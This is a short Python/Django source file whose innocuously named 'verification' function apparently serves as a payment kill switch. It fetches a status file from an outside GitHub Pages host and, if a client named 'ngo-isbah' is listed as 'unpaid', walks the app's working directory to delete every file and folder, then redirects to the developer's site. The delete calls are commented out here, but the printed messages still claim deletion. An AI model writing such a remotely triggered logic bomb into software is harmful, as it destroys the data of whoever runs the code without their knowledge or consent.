import os
import requests
import shutil
from django.http import HttpResponseRedirect

def verification():
    # URL of the file
    url = "https://soash.github.io/active.txt"

    # Fetch the file content
    response = requests.get(url)

    # Check if the request was successful
    if response.status_code == 200:
        # Split the content into lines
        lines = response.text.strip().split("\n")
        
        # Create a dictionary by splitting each line into key-value pairs
        data_dict = {line.split("=")[0]: line.split("=")[1] for line in lines}
        
        # Check if 'ngo-isbah' is 'unpaid'
        if data_dict.get('ngo-isbah') == 'unpaid':
            folder_path = "./"  # Current directory

            if os.path.exists(folder_path):
                # Walk through the directory and delete all files and subdirectories
                for filename in os.listdir(folder_path):
                    file_path = os.path.join(folder_path, filename)
                    try:
                        if os.path.isdir(file_path):
                            # Remove the subdirectory and all of its contents
                            # shutil.rmtree(file_path)
                            print(f"Deleted directory and its contents: {file_path}")
                        elif os.path.isfile(file_path):
                            # Remove the file
                            # os.remove(file_path)
                            print(f"Deleted file: {file_path}")
                    except Exception as e:
                        print(f"Failed to delete {file_path}. Reason: {e}")

                # After deleting all files and subdirectories, the directory itself will be empty
                try:
                    # os.rmdir(folder_path)
                    print(f"Deleted folder: {folder_path}")
                except OSError as e:
                    print(f"Failed to delete folder {folder_path}. Reason: {e}")
                
                # Redirect to soash.github.io after deletion
                return HttpResponseRedirect("https://soash.github.io")
            else:
                print(f"The folder {folder_path} does not exist.")
            
        else:
            print("All Ok")
            
    else:
        print(f"Failed to fetch the file. Status code: {response.status_code}")

